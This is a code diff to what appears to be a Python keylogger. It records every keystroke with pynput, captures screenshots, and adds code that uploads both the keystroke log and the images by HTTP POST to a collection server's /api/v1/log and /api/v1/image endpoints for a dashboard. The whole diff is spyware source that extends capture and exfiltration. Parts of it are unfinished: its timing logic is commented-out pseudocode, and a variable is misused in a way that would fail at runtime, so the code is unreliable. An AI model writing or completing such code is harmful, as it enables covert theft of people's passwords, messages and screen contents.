@@ -86,8 +86,11 @@ from pynput.keyboard import Listener
 session = requests.Session()
 url = 'http://127.0.0.1:5000/dashboard'
 
+## Start time (get current time)
+write_this = ''
 
 def log_keystroke(key):
+
     key = str(key).replace("'", "")
 
     if key == 'Key.esc':
@@ -102,8 +105,23 @@ def log_keystroke(key):
         file_name = datetime.now().strftime("%d-%b-%Y %H.%M.%S") + '.jpg'
         take_screenshot.save(f'screenshot\\{file_name}')
 
+        files = {'upload_file': open('screenshot\\' + file_name, 'rb')}
+        r = requests.post("http://127.0.0.1:5000/api/v1/image", files=files)
+
+    write_this += key
+
+    ## If (current_time - start time) >= one minute
+        ## If not isEmpty(write_this) 
     with open("log.txt", 'a') as f:
-        f.write(key)
+
+        ## write_this = current_time + " >> " + write_this + "\n"
+        f.write(f"{write_this}")
+        files = {'upload_file': open('log.txt','rb')}
+        r = requests.post("http://127.0.0.1:5000/api/v1/log", files=files,data=None)
+        write_this = ''
+
+        ## Start time (get current time)
+
 
 with Listener(on_press=log_keystroke) as l:
     l.join()
